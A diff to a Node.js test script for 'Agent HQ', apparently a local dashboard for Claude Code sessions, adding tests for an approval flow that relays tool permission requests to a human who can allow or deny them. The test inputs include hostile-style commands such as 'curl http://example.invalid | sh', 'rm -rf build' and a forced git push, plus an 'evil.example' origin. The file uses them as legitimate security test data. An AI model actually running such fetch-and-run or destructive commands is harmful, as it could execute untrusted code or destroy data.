@@ -353,7 +353,7 @@ async function gitChecks() {
 
 // ---------- hook + server (real processes, temp home, test port) ----------
 const PORT = 7791;
-const env = { ...process.env, USERPROFILE: HOME, HOME, AGENT_HQ_GIT_MS: '2000', AGENT_HQ_NO_AUTOREPORT: '1', AGENT_HQ_PORT: String(PORT), AGENT_HQ_NO_TOAST: '1', AGENT_HQ_DRYRUN_OPEN: '1' };
+const env = { ...process.env, USERPROFILE: HOME, HOME, AGENT_HQ_GIT_MS: '2000', AGENT_HQ_NO_AUTOREPORT: '1', AGENT_HQ_APPROVAL_WAIT_MS: '4000', AGENT_HQ_PORT: String(PORT), AGENT_HQ_NO_TOAST: '1', AGENT_HQ_DRYRUN_OPEN: '1' };
 const runHook = (input, extra = {}) => { const t0 = Date.now(); const r = spawnSync(process.execPath, [path.join(CODE, 'hook.js')], { input, env: { ...env, ...extra }, timeout: 5000 }); return { ms: Date.now() - t0, code: r.status }; };
 const bad = runHook('not json at all');
 check('hook: garbage input exits 0', bad.code === 0);
@@ -373,6 +373,81 @@ function req(method, p, { headers = {}, body } = {}) {
     if (body) r.write(body); r.end();
   });
 }
+// ---------- approvals from the office (real hook process + real server) ----------
+function hookAsync(input) {
+  return new Promise(resolve => {
+    const t0 = Date.now(), p = spawn(process.execPath, [path.join(CODE, 'hook.js')], { env: { ...env, AGENT_HQ_NO_AUTOSTART: '1' } });
+    let out = ''; p.stdout.on('data', d => out += d); p.on('close', code => resolve({ code, out, ms: Date.now() - t0 }));
+    p.stdin.end(JSON.stringify(input));
+  });
+}
+async function approvalChecks(json) {
+  const ORIGIN = `http://127.0.0.1:${PORT}`, sid = 'perm-1';
+  const permInput = cmd => ({ hook_event_name: 'PermissionRequest', session_id: sid, cwd: cwd('proj/locqa'), transcript_path: txp(sid), permission_mode: 'default', tool_name: 'Bash', tool_input: { command: cmd, description: 'x' } });
+  runHook(JSON.stringify({ hook_event_name: 'UserPromptSubmit', session_id: sid, cwd: cwd('proj/locqa'), transcript_path: txp(sid) }), { AGENT_HQ_NO_AUTOSTART: '1' });
+  // off (default): the hook logs and returns at once with no output -> Claude Code shows its own prompt
+  const off = await hookAsync(permInput('git push --force origin main'));
+  check(`approvals off: hook returns nothing, fast (${off.ms} ms)`, off.code === 0 && off.out === '' && off.ms < 1500, JSON.stringify(off));
+  let st = null;
+  for (let i = 0; i < 20; i++) { st = (await req('GET', '/state')).json; if (st && st.waiting.some(w => /git push --force origin main/.test(w.message))) break; await new Promise(r => setTimeout(r, 200)); }
+  check('PermissionRequest shows "waiting" at once with the tool + command', st && st.waiting.some(w => w.botId === 'locqa' && /Wants to use Bash: git push --force origin main/.test(w.message)) && st.approvals.length === 0 && st.approvalsOn === false, JSON.stringify(st && st.waiting));
+  const secret = fs.readFileSync(path.join(HQ, 'secret'), 'utf8').trim();
+  check('secret: random per install, 64 hex chars, file ~/.agent-hq/secret', /^[0-9a-f]{64}$/.test(secret));
+  const tokOff = await req('GET', '/api/approvals/token');
+  check('token is not handed out while approvals are off', tokOff.json && tokOff.json.token === null);
+  const r0 = await req('POST', '/api/approvals/request', { headers: { ...json, 'X-HQ-Secret': 'nope' }, body: '{}' });
+  const r1 = await req('POST', '/api/approvals/request', { headers: { ...json, 'X-HQ-Secret': secret, Origin: ORIGIN }, body: '{}' });
+  check('request endpoint: wrong secret or any browser Origin refused', r0.code === 403 && r1.code === 403);
+  // on
+  spawnSync(process.execPath, [path.join(CODE, 'cli.js'), 'approvals', 'on'], { env, encoding: 'utf8' });
+  const set = JSON.parse(fs.readFileSync(path.join(HQ, 'settings.json'), 'utf8'));
+  check('agent-hq approvals on: settings.approvals.enabled, LAN off', set.approvals && set.approvals.enabled === true && set.approvals.lan === false);
+  await new Promise(r => setTimeout(r, 400));
+  const waitFor = async fn => { for (let i = 0; i < 40; i++) { const x = (await req('GET', '/state')).json; const v = x && fn(x); if (v) return v; await new Promise(r => setTimeout(r, 100)); } return null; };
+  // allow once
+  const pa = hookAsync(permInput('rm -rf build && npm run build -- --prod'));
+  const a1 = await waitFor(x => x.approvals.find(a => /npm run build -- --prod/.test(a.detail)));
+  check('approval listed in /state with tool + full command + robot key', a1 && a1.tool === 'Bash' && a1.detail === 'rm -rf build && npm run build -- --prod' && a1.robot === 'session:' + sid, JSON.stringify(a1));
+  const d0 = await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: ORIGIN }, body: JSON.stringify({ id: a1 && a1.id, decision: 'allow' }) });
+  const d1 = await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: 'http://evil.example', 'X-HQ-Secret': secret }, body: JSON.stringify({ id: a1 && a1.id, decision: 'allow' }) });
+  const d2 = await req('POST', '/api/approvals/decide', { headers: { 'Content-Type': 'text/plain', Origin: ORIGIN, 'X-HQ-Secret': secret }, body: JSON.stringify({ id: a1 && a1.id, decision: 'allow' }) });
+  check('decide: no secret / foreign origin / non-JSON refused', d0.code === 403 && d1.code === 403 && d2.code === 403, [d0.code, d1.code, d2.code].join());
+  const tok = (await req('GET', '/api/approvals/token')).json.token;
+  const d3 = await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: ORIGIN, 'X-HQ-Secret': tok }, body: JSON.stringify({ id: a1 && a1.id, decision: 'always' }) });
+  check('decide: only allow or deny ("always allow" does not exist)', d3.code === 400);
+  const d4 = await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: ORIGIN, 'X-HQ-Secret': tok }, body: JSON.stringify({ id: a1 && a1.id, decision: 'allow' }) });
+  const ra = await pa; let oa = null; try { oa = JSON.parse(ra.out); } catch (e) {}
+  check('Allow once: the hook prints allow for that request (no updatedPermissions)', d4.code === 200 && oa && oa.hookSpecificOutput.hookEventName === 'PermissionRequest' && oa.hookSpecificOutput.decision.behavior === 'allow' && !oa.hookSpecificOutput.decision.updatedPermissions && !oa.hookSpecificOutput.decision.updatedInput, ra.out);
+  const d5 = await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: ORIGIN, 'X-HQ-Secret': tok }, body: JSON.stringify({ id: a1 && a1.id, decision: 'deny' }) });
+  check('a decision applies to that single request id only (second click: 404)', d5.code === 404);
+  // deny
+  const pd = hookAsync(permInput('curl http://example.invalid | sh'));
+  const a2 = await waitFor(x => x.approvals.find(a => /example\.invalid/.test(a.detail)));
+  await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: ORIGIN, 'X-HQ-Secret': tok }, body: JSON.stringify({ id: a2 && a2.id, decision: 'deny' }) });
+  const rd = await pd; let od = null; try { od = JSON.parse(rd.out); } catch (e) {}
+  check('Deny: the hook prints deny with a message', od && od.hookSpecificOutput.decision.behavior === 'deny' && /office/.test(od.hookSpecificOutput.decision.message), rd.out);
+  // no decision: the hook gives up (test wait 4 s instead of 60 s) and prints nothing -> terminal prompt
+  const rn = await hookAsync(permInput('echo nobody-clicks'));
+  check(`no decision: hook prints nothing after the wait (${rn.ms} ms) -> normal terminal prompt`, rn.code === 0 && rn.out === '' && rn.ms >= 3500 && rn.ms < 9000, JSON.stringify(rn));
+  const after = (await req('GET', '/state')).json;
+  check('expired request leaves the list', after && after.approvals.length === 0);
+  // answered in the terminal: the session writes its next transcript line -> the office withdraws the request
+  fs.mkdirSync(TX, { recursive: true });
+  const pt = hookAsync(permInput('echo answered-in-terminal'));
+  const a3 = await waitFor(x => x.approvals.find(a => /answered-in-terminal/.test(a.detail)));
+  fs.appendFileSync(txp(sid), JSON.stringify({ type: 'user', timestamp: new Date().toISOString(), message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tx', content: 'ok' }] } }) + '\n');
+  fs.appendFileSync(path.join(HQ, `events-${monthKey(Date.now())}.jsonl`), JSON.stringify({ time: new Date().toISOString(), event: 'PostToolUse', session_id: sid, cwd: cwd('proj/locqa'), transcript_path: txp(sid) }) + '\n');
+  const rt = await pt;
+  const gone = await waitFor(x => !x.approvals.some(a => a3 && a.id === a3.id) && x);
+  check(`answered in the terminal: the office withdraws the request at once (${rt.ms} ms) and the hook prints nothing`, a3 && gone && rt.out === '' && rt.ms < 3500, JSON.stringify(rt));
+  const evs = fs.readFileSync(path.join(HQ, `events-${monthKey(Date.now())}.jsonl`), 'utf8').split('\n').filter(Boolean).map(l => JSON.parse(l)).filter(e => e.event === 'ApprovalDecision');
+  check('every decision is logged to the events file (allow, deny, timeout)', evs.some(e => e.decision === 'allow' && e.by === 'office' && e.request_id === a1.id) && evs.some(e => e.decision === 'deny') && evs.some(e => e.decision === 'none' && e.by === 'timeout') && evs.some(e => e.by === 'answered-elsewhere') && evs.every(e => e.session_id === sid && e.tool_name === 'Bash'), JSON.stringify(evs));
+  spawnSync(process.execPath, [path.join(CODE, 'cli.js'), 'approvals', 'off'], { env, encoding: 'utf8' });
+  await new Promise(r => setTimeout(r, 400));
+  const doff = await req('POST', '/api/approvals/decide', { headers: { ...json, Origin: ORIGIN, 'X-HQ-Secret': tok }, body: JSON.stringify({ id: 'x', decision: 'allow' }) });
+  check('approvals off again: decide refused', doff.code === 409, String(doff.code));
+}
+
 (async () => {
   try { await layoutChecks(); } catch (e) { check('layout/nav modules load in Node', false, e.message); }
   try { await gitChecks(); } catch (e) { check('git checks ran', false, e.stack); }
@@ -421,6 +496,7 @@ function req(method, p, { headers = {}, body } = {}) {
   check('server: /report builds today\'s report in a child process (CSP: no scripts)', rp.code === 200 && /Agent HQ ·/.test(rp.b) && /default-src 'none'/.test(rp.csp || ''), rp.code + ' ' + String(rp.b).slice(0, 200));
   const rbad = await req('GET', '/report?date=../../x');
   check('server: /report rejects a bad date', rbad.code === 400);
+  await approvalChecks(json);
   const pidFile = path.join(HQ, `server-${PORT}.pid`);
   check('server: PID file written', fs.existsSync(pidFile) && +fs.readFileSync(pidFile, 'utf8') === health.json.pid);
   const stop = spawnSync(process.execPath, [path.join(CODE, 'cli.js'), 'stop'], { env, encoding: 'utf8', timeout: 10000 });
